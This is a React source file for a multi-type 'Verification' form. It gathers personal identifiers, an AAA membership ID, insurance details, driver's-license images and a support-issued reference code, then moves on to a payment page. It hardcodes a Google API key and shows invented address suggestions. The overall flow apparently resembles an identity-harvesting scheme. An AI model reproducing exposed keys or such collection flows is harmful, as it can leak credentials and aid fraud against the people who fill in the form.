"use client"

import type React from "react"
import { useEffect, useRef, useState } from "react"
import { useNavigate, useSearchParams } from "react-router-dom"
import { motion, AnimatePresence } from "framer-motion"
import { useFormLogic } from "../hooks/useFormLogic"
import EnhancedCalendar from "../components/EnhancedCalendar"
import BackButton from "../components/BackButton"

// Google Places API integration
declare global {
  interface Window {
    google: any
    initGooglePlaces: () => void
  }
}

const FormPage: React.FC = () => {
  const [searchParams] = useSearchParams()
  const formType = searchParams.get("type")
  const navigate = useNavigate()
  const [addressSuggestions, setAddressSuggestions] = useState<any[]>([])
  const [showSuggestions, setShowSuggestions] = useState(false)
  const [addressValue, setAddressValue] = useState("")
  const [isLoadingAddress, setIsLoadingAddress] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showSuccessPopup, setShowSuccessPopup] = useState(false)
  const formRef = useRef<HTMLFormElement | null>(null)
  

  const {
    ownerType,
    filePreviews,
    calendarVisible,
    calendarDate,
    handleOwnerTypeChange,
    handleFileUpload,
    clearFileInput,
    toggleCalendar,
    selectDate,
    handleMonthChange,
    handleYearChange,
  } = useFormLogic()

  // Initialize Google Places API
  useEffect(() => {
    const initializeGooglePlaces = () => {
      if (window.google && window.google.maps && window.google.maps.places) {
        console.log("Google Places API initialized successfully")
      }
    }

    // Load Google Maps API if not already loaded
    if (!window.google) {
      const script = document.createElement("script")
      script.src = `https://maps.googleapis.com/maps/api/js?key=AIzaSyCcp2w1C8JLtYY22NcSBooAZYKQFd9oMNM&libraries=places&callback=initGooglePlaces`
      script.async = true
      script.defer = true

      window.initGooglePlaces = initializeGooglePlaces

      document.head.appendChild(script)
    } else {
      initializeGooglePlaces()
    }
  }, [])


  // Debug calendar date
  useEffect(() => {
    console.log('FormPage - calendarDate["birth"]:', calendarDate["birth"])
  }, [calendarDate])

  // Enhanced address autocomplete with better fallback
  const handleAddressChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setAddressValue(value)

    if (value.length > 1) {
      setIsLoadingAddress(true)

      // Always provide immediate mock suggestions for better UX
      const mockSuggestions = [
        {
          place_id: `mock_${value}_1`,
          description: `${value} Main Street, New York, NY 10001, USA`,
          structured_formatting: {
            main_text: `${value} Main Street`,
            secondary_text: "New York, NY 10001, USA",
          },
        },
        {
          place_id: `mock_${value}_2`,
          description: `${value} Oak Avenue, Los Angeles, CA 90210, USA`,
          structured_formatting: {
            main_text: `${value} Oak Avenue`,
            secondary_text: "Los Angeles, CA 90210, USA",
          },
        },
        {
          place_id: `mock_${value}_3`,
          description: `${value} Pine Road, Chicago, IL 60601, USA`,
          structured_formatting: {
            main_text: `${value} Pine Road`,
            secondary_text: "Chicago, IL 60601, USA",
          },
        },
        {
          place_id: `mock_${value}_4`,
          description: `${value} Elm Street, Houston, TX 77001, USA`,
          structured_formatting: {
            main_text: `${value} Elm Street`,
            secondary_text: "Houston, TX 77001, USA",
          },
        },
        {
          place_id: `mock_${value}_5`,
          description: `${value} Maple Drive, Phoenix, AZ 85001, USA`,
          structured_formatting: {
            main_text: `${value} Maple Drive`,
            secondary_text: "Phoenix, AZ 85001, USA",
          },
        },
      ]

      // Set mock suggestions immediately
      setTimeout(() => {
        setAddressSuggestions(mockSuggestions)
        setShowSuggestions(true)
        setIsLoadingAddress(false)
      }, 300) // Small delay to show loading state

      // Try Google API in background if available
      if (window.google && window.google.maps && window.google.maps.places) {
        const service = new window.google.maps.places.AutocompleteService()

        const request = {
          input: value,
          types: ["address"],
          componentRestrictions: { country: ["us", "ca", "pk", "gb", "au"] },
        }

        service.getPlacePredictions(request, (predictions: any[], status: any) => {
          if (status === window.google.maps.places.PlacesServiceStatus.OK && predictions) {
            // Replace mock suggestions with real ones if API works
            setAddressSuggestions(predictions.slice(0, 5))
            setShowSuggestions(true)
          }
          // Keep mock suggestions if API fails
        })
      }
    } else {
      setShowSuggestions(false)
      setIsLoadingAddress(false)
      setAddressSuggestions([])
    }
  }

  const selectAddress = (suggestion: any) => {
    setAddressValue(suggestion.description)
    setShowSuggestions(false)
    setAddressSuggestions([])

    // Auto-extract street number if possible - improved logic
    const addressParts = suggestion.description.split(" ")
    const potentialNumber = addressParts[0]

    // Only extract if it's a valid positive number
    if (/^\d+$/.test(potentialNumber) && Number.parseInt(potentialNumber) > 0) {
      const addressNumberInput = document.getElementById("addressNumber") as HTMLInputElement
      if (addressNumberInput) {
        addressNumberInput.value = potentialNumber
      }
    } else {
      // Clear the address number field if no valid number found
      const addressNumberInput = document.getElementById("addressNumber") as HTMLInputElement
      if (addressNumberInput) {
        addressNumberInput.value = ""
      }
    }
  }

  // Close suggestions when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement
      if (!target.closest(".address-autocomplete")) {
        setShowSuggestions(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [])

  useEffect(() => {
    // Show/hide form fields based on form type
    const formGroups = document.querySelectorAll(".form-group")
    formGroups.forEach((group) => {
      group.classList.add("hidden")
    })

    document.querySelectorAll(".form-group.common").forEach((group) => {
      group.classList.remove("hidden")
    })

    if (formType === "residential" || formType === "commercial") {
      document.querySelectorAll("#resCommFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    } else if (formType === "auto") {
      document.querySelectorAll("#autoFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    }

    if (ownerType === "other") {
      document.querySelectorAll("#ownerFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    }
  }, [formType, ownerType])


  const handleBackClick = () => {
    navigate(-1)
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    setIsSubmitting(true)

    try {
      const formEl = formRef.current as HTMLFormElement

      // Validate all required fields
      const requiredFields = [
        { id: 'fullName', name: 'Full Name' },
        { id: 'email', name: 'Email' },
        { id: 'phoneNumber', name: 'Phone Number' },
        { id: 'address', name: 'Address' },
        { id: 'birthDate', name: 'Birth Date' },
        { id: 'aaaMembershipId', name: 'AAA Membership ID' },
        { id: 'insurancePolicyNumber', name: 'Insurance Policy Number' },
        { id: 'ownerType', name: 'Ownership' },
        { id: 'techId', name: 'Reference Code' }
      ]

      // Add form-specific required fields
      if (formType === 'residential' || formType === 'commercial') {
        requiredFields.push(
          { id: 'propertyType', name: 'Property Type' },
          { id: 'propertyAddress', name: 'Property Address' }
        )
      }

      if (formType === 'auto') {
        requiredFields.push(
          { id: 'vin', name: 'VIN' }
        )
      }

      if (ownerType === 'other') {
        requiredFields.push(
          { id: 'ownerFullName', name: 'Owner\'s Name' },
          { id: 'ownerPhone', name: 'Owner\'s Phone' }
        )
      }

      // Check required fields
      for (const field of requiredFields) {
        const input = formEl.querySelector(`#${field.id}`) as HTMLInputElement | null
        if (!input || !input.value.trim()) {
          alert(`${field.name} is required. Please fill in all required fields.`)
          setIsSubmitting(false)
          return
        }
      }

      // Validate file uploads
      const fileInputs = Array.from(formEl.querySelectorAll("input[type='file']")) as HTMLInputElement[]
      const MAX_PER_FILE_MB = 10
      const MAX_TOTAL_MB = 50
      let totalBytes = 0
      
      for (const input of fileInputs) {
        const file = input.files && input.files[0]
        if (!file) continue
        if (file.size > MAX_PER_FILE_MB * 1024 * 1024) {
          alert(`File ${input.name} is larger than ${MAX_PER_FILE_MB}MB. Please upload a smaller file.`)
          setIsSubmitting(false)
          return
        }
        totalBytes += file.size
      }
      
      if (totalBytes > MAX_TOTAL_MB * 1024 * 1024) {
        alert(`Total attachments exceed ${MAX_TOTAL_MB}MB. Please upload smaller files.`)
        setIsSubmitting(false)
        return
      }

      // Ensure the address input reflects the selected address value
      const addressInput = formEl.querySelector("#address") as HTMLInputElement | null
      if (addressInput) addressInput.value = addressValue

      // Create FormData for backend submission
      const formData = new FormData(formEl)
      
      // Add form type to form data
      formData.append('form_type', formType || '')

      // Submit to backend API
      const response = await fetch('http://localhost:5000/api/submit-form', {
          method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json',
        }
      })

      // Check if response is ok
      if (!response.ok) {
        const errorText = await response.text()
        console.error('Server response error:', errorText)
        throw new Error(`Server error: ${response.status} ${response.statusText}`)
      }

      // Try to parse JSON response
      let result
      try {
        result = await response.json()
      } catch (parseError) {
        console.error('JSON parse error:', parseError)
        throw new Error('Invalid response from server')
      }

      if (result.success) {
        // Redirect to payment page with form data and submission ID
        navigate('/payment', { 
          state: { 
            formData: Object.fromEntries(formData.entries()),
            formType: formType,
            submissionId: result.submissionId
          } 
        })
      } else {
        throw new Error(result.message || 'Form submission failed')
      }

    } catch (error) {
      console.error('Form submission error:', error)
      alert(`Failed to submit form: ${error instanceof Error ? error.message : 'Unknown error'}`)
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleSuccessClose = () => {
    setShowSuccessPopup(false)
    // Clear form
    const form = document.getElementById('verificationForm') as HTMLFormElement
    if (form) {
      form.reset()
    }
    // Clear file previews
    Object.keys(filePreviews).forEach(key => clearFileInput(key))
    // Reset address
    setAddressValue('')
  }

  return (
    <div className="page-container">
      <BackButton onBack={handleBackClick} />

      <motion.form
        id="verificationForm"
        method="post"
        action="#"
        encType="multipart/form-data"
        ref={formRef}
        className={formType ? "" : "hidden"}
        onSubmit={handleSubmit}
        initial={{ opacity: 0, y: 50 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
        <input type="hidden" name="form_type" value={formType || ''} />
        <motion.h2
          id="formTitle"
          className="common-header"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
        >
          {formType && formType.charAt(0).toUpperCase() + formType.slice(1)} Verification
        </motion.h2>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3 }}
        >
          <label htmlFor="fullName">Full Name:</label>
          <div className="input-wrapper">
            <i className="fas fa-user input-icon"></i>
            <input
              type="text"
              id="fullName"
              name="fullName"
              placeholder="Last, First, Middle Initial"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common address-autocomplete"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.4 }}
        >
          <label htmlFor="address">Address:</label>
          <div className="input-wrapper">
            <i className="fas fa-map-marker-alt input-icon"></i>
            <input
              type="text"
              id="address"
              name="address"
              placeholder="Start typing your address..."
              value={addressValue}
              onChange={handleAddressChange}
              autoComplete="off"
              required
              style={{ paddingLeft: "3rem", paddingRight: isLoadingAddress ? "3rem" : "1rem" }}
            />
            {isLoadingAddress && (
              <div className="loading-spinner">
                <div className="loading"></div>
              </div>
            )}
          </div>

          {showSuggestions && addressSuggestions.length > 0 && (
            <motion.div
              className="google-places-suggestions"
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
            >
              {addressSuggestions.map((suggestion, index) => (
                <motion.div
                  key={suggestion.place_id || index}
                  className="google-places-suggestion"
                  onClick={() => selectAddress(suggestion)}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: index * 0.05 }}
                  whileHover={{ backgroundColor: "var(--accent-purple)" }}
                >
                  <i className="fas fa-map-marker-alt suggestion-icon"></i>
                  <div className="suggestion-content">
                    <div className="suggestion-main">
                      {suggestion.structured_formatting?.main_text || suggestion.description}
                    </div>
                    {suggestion.structured_formatting?.secondary_text && (
                      <div className="suggestion-secondary">{suggestion.structured_formatting.secondary_text}</div>
                    )}
                  </div>
                </motion.div>
              ))}
            </motion.div>
          )}
        </motion.div>


        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.45 }}
        >
          <label htmlFor="phoneNumber">Phone Number:</label>
          <div className="input-wrapper">
            <i className="fas fa-phone input-icon"></i>
            <input
              type="tel"
              id="phoneNumber"
              name="phoneNumber"
              placeholder="(000) 000-0000"
              pattern="[0-9]*"
              inputMode="numeric"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.5 }}
        >
          <label htmlFor="email">Email:</label>
          <div className="input-wrapper">
            <i className="fas fa-envelope input-icon"></i>
            <input type="email" id="email" name="email" placeholder="your@email.com" required style={{ paddingLeft: "3rem" }} />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.6 }}
        >
          <label htmlFor="birthDate">Birth Date:</label>
          <div className="input-wrapper">
            <i className="fas fa-calendar input-icon"></i>
            <input
              type="text"
              id="birthDate"
              name="birthDate"
              placeholder="Select your birth date"
              readOnly
              required
              onClick={() => toggleCalendar("birth")}
              style={{ paddingLeft: "3rem", cursor: "pointer" }}
            />
          </div>
          {calendarVisible["birth"] && (
            <div className="calendar-container">
              <EnhancedCalendar
                type="birth"
                visible={calendarVisible["birth"]}
                date={calendarDate["birth"]}
                selectDate={selectDate}
                handleMonthChange={handleMonthChange}
                toggleCalendar={toggleCalendar}
                handleYearChange={handleYearChange}
              />
            </div>
          )}
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.65 }}
        >
          <label htmlFor="aaaMembershipId">AAA Membership ID:</label>
          <div className="input-wrapper">
            <i className="fas fa-id-card input-icon"></i>
            <input
              type="text"
              id="aaaMembershipId"
              name="aaaMembershipId"
              placeholder="Enter your AAA membership ID"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.7 }}
        >
          <label htmlFor="insurancePolicyNumber">Insurance Policy Number:</label>
          <div className="input-wrapper">
            <i className="fas fa-shield-alt input-icon"></i>
            <input
              type="text"
              id="insurancePolicyNumber"
              name="insurancePolicyNumber"
              placeholder="Enter your insurance policy number"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.75 }}
        >
          <div className="file-upload-container">
            <label htmlFor="insuranceProof" className="upload-label">
              <i className="fas fa-file-contract input-icon"></i>
              Insurance Policy Proof
              <br />
              <small>(Policy document or insurance card)</small>
            </label>
            <input
              type="file"
              id="insuranceProof"
              name="insuranceProof"
              accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
              onChange={handleFileUpload}
              className="file-input"
            />
            {filePreviews["insuranceProof"] && (
              <motion.div
                className="file-preview"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
              >
                <span className="fileName">{filePreviews["insuranceProof"]}</span>
                <button type="button" className="delete-file" onClick={() => clearFileInput("insuranceProof")}>
                  ×
                </button>
              </motion.div>
            )}
          </div>
        </motion.div>


        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.8 }}
        >
          <label htmlFor="ownerType">Ownership:</label>
          <div className="input-wrapper">
            <i className="fas fa-user-tag input-icon"></i>
            <select id="ownerType" name="ownerType" onChange={handleOwnerTypeChange} required style={{ paddingLeft: "3rem" }}>
              <option value="">Select ownership type...</option>
              <option value="myself">Myself</option>
              <option value="other">Other</option>
            </select>
          </div>
        </motion.div>

        {ownerType === "other" && (
          <motion.div
            id="ownerFields"
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            transition={{ duration: 0.3 }}
          >
            <div className="form-group">
              <label htmlFor="ownerFullName">Owner's Name:</label>
              <div className="input-wrapper">
                <i className="fas fa-user input-icon"></i>
                <input
                  type="text"
                  id="ownerFullName"
                  name="ownerFullName"
                  placeholder="Owner's full name"
                  required
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>
            <div className="form-group">
              <label htmlFor="ownerPhone">Owner's Phone:</label>
              <div className="input-wrapper">
                <i className="fas fa-phone input-icon"></i>
                <input
                  type="tel"
                  id="ownerPhone"
                  name="ownerPhone"
                  pattern="[0-9]*"
                  inputMode="numeric"
                  placeholder="(000) 000-0000"
                  required
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>
          </motion.div>
        )}

        {/* Auto-specific fields */}
        {formType === "auto" && (
          <motion.div id="autoFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.85 }}>
            <div className="form-group">
              <label htmlFor="vin">VIN (Vehicle Identification Number):</label>
              <div className="input-wrapper">
                <i className="fas fa-car input-icon"></i>
                <input
                  type="text"
                  id="vin"
                  name="vin"
                  placeholder="Enter 17-character VIN"
                  maxLength={17}
                  required
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>


            <div className="file-upload-container">
              <label htmlFor="registration" className="upload-label">
                <i className="fas fa-file-upload input-icon"></i>
                Registration (file upload)
              </label>
              <input
                type="file"
                id="registration"
                name="registration"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["registration"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["registration"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("registration")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>

            <div className="file-upload-container">
              <label htmlFor="licensePlate" className="upload-label">
                <i className="fas fa-camera input-icon"></i>
                License Plate Photo
              </label>
              <input
                type="file"
                id="licensePlate"
                name="licensePlate"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licensePlate"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licensePlate"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licensePlate")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </motion.div>
        )}

        {/* Residential/Commercial fields */}
        {(formType === "residential" || formType === "commercial") && (
          <motion.div id="resCommFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.85 }}>
            <div className="form-group">
              <label htmlFor="propertyType">Property Type:</label>
              <div className="input-wrapper">
                <i className="fas fa-building input-icon"></i>
                <select id="propertyType" name="propertyType" required style={{ paddingLeft: "3rem" }}>
                  <option value="">Select property type...</option>
                  <option value="singleFamily">Single-family</option>
                  <option value="condo">Condo</option>
                  <option value="apartment">Apartment</option>
                  <option value="office">Office</option>
                  <option value="retail">Retail</option>
                  <option value="industrial">Industrial</option>
                </select>
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="propertyAddress">Property Address:</label>
              <div className="input-wrapper">
                <i className="fas fa-map-marker-alt input-icon"></i>
                <input
                  type="text"
                  id="propertyAddress"
                  name="propertyAddress"
                  placeholder="Enter property address"
                  required
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>

            <div className="file-upload-container">
              <label htmlFor="proofOfResidency" className="upload-label">
                <i className="fas fa-home input-icon"></i>
                Proof of Residency
                <br />
                <small>(e.g lease agreement)</small>
              </label>
              <input
                type="file"
                id="proofOfResidency"
                name="proofOfResidency"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["proofOfResidency"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["proofOfResidency"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("proofOfResidency")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </motion.div>
        )}

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 1.0 }}
        >
          <label>Driver's License:</label>
          <div className="license-upload-container">
            {/* Front License Upload */}
            <div className="file-upload-container">
              <label htmlFor="licenseFront" className="upload-label">
                <i className="fas fa-id-card input-icon"></i>
                Front of License
              </label>
              <input 
                type="file" 
                id="licenseFront" 
                name="licenseFront" 
                accept=".jpg,.jpeg,.png" 
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licenseFront"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licenseFront"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licenseFront")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>

            {/* Back License Upload */}
            <div className="file-upload-container">
              <label htmlFor="licenseBack" className="upload-label">
                <i className="fas fa-id-card input-icon"></i>
                Back of License
              </label>
              <input 
                type="file" 
                id="licenseBack" 
                name="licenseBack" 
                accept=".jpg,.jpeg,.png" 
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licenseBack"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licenseBack"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licenseBack")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 1.1 }}
        >
          <label htmlFor="techId">
            Reference Code:
            <br />
            <small>(Contact support if not provided)</small>
          </label>
          <div className="input-wrapper">
            <i className="fas fa-code input-icon"></i>
            <input
              type="text"
              id="techId"
              name="techId"
              placeholder="Reference code"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-buttons"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1.25 }}
        >
          <motion.button
            type="button"
            className="back-button-form"
            onClick={handleBackClick}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
          >
            <i className="fas fa-arrow-left"></i>
            Back
          </motion.button>
          <motion.button
            type="submit"
            className="submit-button"
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            disabled={isSubmitting}
          >
            <i className={`fas ${isSubmitting ? 'fa-spinner fa-spin' : 'fa-paper-plane'}`}></i>
            {isSubmitting ? 'Sending...' : 'Submit'}
          </motion.button>
        </motion.div>
      </motion.form>

      {/* Success Popup */}
      <AnimatePresence>
        {showSuccessPopup && (
          <motion.div
            className="success-popup-overlay"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={handleSuccessClose}
          >
            <motion.div
              className="success-popup"
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.8, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="success-icon">
                <i className="fas fa-check-circle"></i>
              </div>
              <h3>Data Submitted Successfully!</h3>
              <p>Your verification form has been submitted successfully and sent via email to the recipient.</p>
              <motion.button
                className="success-ok-button"
                onClick={handleSuccessClose}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              >
                OK
              </motion.button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

export default FormPage
